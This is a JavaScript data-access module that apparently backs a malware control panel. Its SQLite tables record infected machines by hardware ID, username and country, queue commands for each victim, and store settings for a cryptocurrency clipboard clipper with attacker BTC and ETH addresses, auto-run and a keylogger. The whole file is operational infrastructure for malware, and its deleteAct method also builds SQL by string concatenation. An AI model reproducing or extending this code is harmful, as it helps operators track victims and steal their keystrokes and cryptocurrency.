const sqlite3 = require("sqlite3");
const Promise = require("bluebird");

class AppDAO {
  
  constructor(dbFilePath) {
    this.db = new sqlite3.Database(dbFilePath, (err) => {
      if (err) {
        console.log("Could not connect to database", err);
      } else {
        console.log("Connected to database");
      }
    });

    this.cDB = `
    CREATE TABLE IF NOT EXISTS settings (
        name text primary key,
        clipper text,
        btcAddy text,
        ethAddy text,
        autoRun text,
        s integer, 
        keylogger text,
        nulled text
    );

    CREATE TABLE IF NOT EXISTS infected (
      hwid text primary key,
      username text,
      country text,
      date text
  );

  CREATE TABLE IF NOT EXISTS actions (
    id integer primary key AUTOINCREMENT,
    hwid text,
    action text,
    data text
  );`;
  }

  run(sql, params = []) {
    return new Promise((resolve, reject) => {
      this.db.run(sql, params, function (err) {
        if (err) {
          console.log("Error running sql " + sql);
          console.log(err);
          reject(err);
        } else {
          resolve({ id: this.lastID });
        }
      });
    });
  }

  exec(sql) {
    return new Promise((resolve, reject) => {
      this.db.exec(sql, function (err) {
        if (err) {
          console.log("Error running sql " + sql);
          console.log(err);
          reject(err);
        } else {
          resolve({ id: this.lastID });
        }
      });
    });
  }

  get(sql, params = []) {
    return new Promise((resolve, reject) => {
      this.db.get(sql, params, (err, result) => {
        if (err) {
          console.log('Error running sql: ' + sql)
          console.log(err)
          reject(err)
        } else {
          resolve(result)
        }
      })
    })
  }

  all(sql, params = []) {
    return new Promise((resolve, reject) => {
      this.db.all(sql, params, (err, rows) => {
        if (err) {
          console.log('Error running sql: ' + sql)
          console.log(err)
          reject(err)
        } else {
          resolve(JSON.stringify(rows))        
        }
      })
    })
  }

  getAction(h) {
    return this.db.get(
      `SELECT * FROM actions WHERE hwid = ?`,
      [h])
  }

  

  addAction(hwid, action, data) {


    return this.run(
      'INSERT INTO actions (hwid, action, data) VALUES (?, ?, ?)',
      [hwid, action, data])
  }

  updateAction(hwid, action, data) {
    return this.run(
      'UPDATE actions SET action = ?, data = ? WHERE hwid = ?',
      [action, data, hwid])
  }

  
  addInfected(hwid, country, username) {

    /* CREATE TABLE IF NOT EXISTS infected (
      id integer primary key AUTOINCREMENT,
      hwid text,
      country text,
      date text */

    return this.run(
      'INSERT INTO infected (hwid, country, date, username) VALUES (?, ?, ?, ?)',
      [hwid, country, (new Date()).toLocaleDateString('en-US'), username])
  }


  addSetting(clipper, btcAddy, ethAddy, autoRun, s, keylogger) {

    /*settings (
        name text primary key,
        clipper text,
        btcAddy text,
        ethAddy text,
        autoRun text,
        s integer, 
        keylogger text
    ) */

    return this.run(
      'INSERT INTO settings (name, clipper, btcAddy, ethAddy, autoRun, s, keylogger) VALUES (?, ?, ?, ?, ?, ?, ?)',
      ['default', clipper, btcAddy, ethAddy, autoRun, s, keylogger])
  }

  updSetting(clipper, btcAddy, ethAddy, autoRun, s, keylogger, n) {
    return this.run(
      `UPDATE settings SET clipper = ?, btcAddy = ?, ethAddy = ?, autoRun = ?, s = ?, keylogger = ?, nulled = ? WHERE name = 'default'`,
      [clipper, btcAddy, ethAddy, autoRun, s, keylogger, n])
  }

  deleteSetting() {
    return this.exec(
      `DELETE FROM settings`
    )
  }

  deleteAct(id) {
    return this.exec(
      `DELETE FROM actions WHERE id = ` + id
    )
  }
  
}

module.exports = AppDAO
